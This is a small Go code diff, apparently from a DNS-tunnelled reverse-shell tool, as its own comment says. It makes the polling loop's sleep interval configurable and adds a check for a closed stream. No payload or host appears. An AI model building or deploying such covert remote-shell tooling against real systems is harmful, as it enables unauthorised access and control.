@@ -16,8 +16,11 @@ func pollRead(stream DnsStream) {
 	loopCounter := 0
 	for {
 		// Sleep, this is a reverse-shell, not a DNS Stress testing tool.
-		time.Sleep(200 * time.Millisecond)
+		time.Sleep(stream.Sleeptime)
 		// Check for data !
+		if ! stream.opened {
+			return
+		}
 		poll(stream)
 		loopCounter += 1
 
